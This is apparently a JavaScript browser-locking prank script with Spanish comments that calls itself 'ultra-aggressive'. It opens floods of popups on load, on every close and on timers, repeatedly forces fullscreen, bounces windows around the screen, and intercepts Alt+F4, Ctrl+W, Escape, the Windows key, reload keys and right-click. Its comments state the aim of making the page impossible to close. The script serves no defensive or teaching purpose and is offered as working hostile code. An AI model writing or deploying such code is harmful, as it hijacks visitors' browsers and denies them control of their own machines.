// Variables del efecto "ventana bailarina"
var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

// ============================================================
// NÚCLEO DE POPUPS — Versión ultra-agresiva
// ============================================================

function openWindow(url){
    try {
        aWindow = window.open(url, "_blank", 
            'menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
        if (aWindow) {
            try { aWindow.focus(); } catch(e) {}
        }
    } catch(e) {}
}

function procreate(){
    // Abrir 12 popups por cada cierre
    for (var i = 0; i < 12; i++) {
        openWindow('open.html');
    }
    // Refuerzo: también abrir popups con nombre aleatorio
    openWindow('open.html?' + Math.random());
    openWindow('open.html?' + Math.random());
    openWindow('open.html?' + Math.random());
}

// ============================================================
// FULLSCREEN FORZADO
// ============================================================

function initFullscreen() {
    // Intentar pantalla completa
    var el = document.documentElement;
    var rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
    if (rfs) {
        try { rfs.call(el); } catch(e) {}
    }
    // Mantener siempre al frente
    keepFocus();
    // Activar efecto bailarín en la ventana principal también
    flagRun = 1;
    playBallMain();
}

function keepFocus() {
    setInterval(function() {
        try {
            window.focus();
            // Intentar pantalla completa de nuevo si se sale
            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                var el = document.documentElement;
                var rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
                if (rfs) rfs.call(el);
            }
        } catch(e) {}
    }, 100);
}

// ============================================================
// VENTANA BAILARINA (principal)
// ============================================================

function newXlt(){
    xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
    window.focus();
}
function newXrt(){
    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function newYup(){
    yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}
function newYdn(){
    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function fOff(){
    flagrun = 0;
}
function playBall(){
    xPos += xOff;
    yPos += yOff;
    if (xPos > screen.width - 175) newXlt();
    if (xPos < 0) newXrt();
    if (yPos > screen.height - 100) newYup();
    if (yPos < 0) newYdn();
    if (flagRun == 1){
        try { window.moveTo(xPos, yPos); } catch(e) {}
        setTimeout('playBall()', 1);
    }
}

function playBallMain(){
    xPos += xOff;
    yPos += yOff;
    if (xPos > window.innerWidth - 175) newXlt();
    if (xPos < 0) newXrt();
    if (yPos > window.innerHeight - 100) newYup();
    if (yPos < 0) newYdn();
    if (flagRun == 1){
        try { window.moveTo(xPos, yPos); } catch(e) {}
        setTimeout('playBallMain()', 1);
    }
}

// ============================================================
// BLOQUEO TOTAL DE TECLAS
// ============================================================

// Bloquear todo intento de cierre
window.onbeforeunload = function() {
    return " ";
};

// Bloquear teclas
document.onkeydown = function(e) {
    e = e || window.event;
    var key = e.keyCode || e.which;
    
    // Alt+F4 (keyCode 115)
    if (e.altKey && key == 115) { e.preventDefault(); e.stopPropagation(); return false; }
    // F11 (pantalla completa)
    if (key == 122) { e.preventDefault(); return false; }
    // Escape
    if (key == 27) { e.preventDefault(); return false; }
    // Ctrl+W, Ctrl+N, Ctrl+T
    if (e.ctrlKey && (key == 87 || key == 78 || key == 84)) { e.preventDefault(); return false; }
    // Ctrl+F4
    if (e.ctrlKey && key == 115) { e.preventDefault(); return false; }
    // Tecla Windows
    if (key == 91 || key == 92) { e.preventDefault(); return false; }
    // F5, F6 (recargar)
    if (key == 116 || key == 117) { e.preventDefault(); return false; }
    // Ctrl+R
    if (e.ctrlKey && key == 82) { e.preventDefault(); return false; }
    // Alt+Tab, Alt+Esc (parcial)
    if (e.altKey && (key == 9 || key == 27)) { e.preventDefault(); return false; }
    // Ctrl+Shift+Esc (task manager) — no se puede bloquear directamente pero intentamos
    if (e.ctrlKey && e.shiftKey && key == 27) { e.preventDefault(); return false; }
    
    return false;
};

// Bloquear clic derecho
document.oncontextmenu = function(e) {
    e.preventDefault();
    return false;
};

// Bloquear selección de texto
document.onselectstart = function(e) {
    e.preventDefault();
    return false;
};

// Bloquear arrastre
document.ondragstart = function(e) {
    e.preventDefault();
    return false;
};

// ============================================================
// AUTO-REAPERTURA — Si detecta que pierde el foco, lo recupera
// ============================================================

window.onblur = function() {
    setTimeout(function() {
        try { window.focus(); } catch(e) {}
    }, 10);
};

// ============================================================
// CAPTURA DEL RATÓN — Para que no puedan hacer clic para cerrar
// ============================================================

document.addEventListener('mousemove', function(e) {
    // Mover la página con el ratón para despistar
    var x = e.clientX;
    var y = e.clientY;
    if (x < 50 || x > window.innerWidth - 50 || y < 50 || y > window.innerHeight - 50) {
        // Si el ratón está cerca del borde, mover la ventana
        try {
            window.moveTo(
                Math.floor(Math.random() * (screen.width - 300)),
                Math.floor(Math.random() * (screen.height - 200))
            );
        } catch(e) {}
    }
});

// ============================================================
// BUCLE DE REFUERZO — Cada 5 segundos abre más popups
// ============================================================

setInterval(function() {
    for (var i = 0; i < 5; i++) {
        openWindow('open.html');
    }
}, 5000);

// ============================================================
// PREVENIR QUE CIERREN EL PROCESO DESDE EL ADMINISTRADOR
// (no se puede evitar del todo, pero hacemos la vida imposible)
// ============================================================

// Abrir popups incluso al cargar (por si acaso)
setTimeout(function() {
    for (var i = 0; i < 10; i++) {
        openWindow('open.html');
    }
}, 1000);

// Escalar: si detecta que quedan pocas ventanas, repoblar
setInterval(function() {
    try {
        // Intentar detectar cuántas ventanas hijas quedan (limitado por seguridad)
        var count = 0;
        for (var key in window) {
            if (key.indexOf('window') > -1) count++;
        }
        // Siempre abrir más, por si acaso
        if (count < 5) {
            for (var i = 0; i < 8; i++) {
                openWindow('open.html');
            }
        }
    } catch(e) {}
}, 2000);
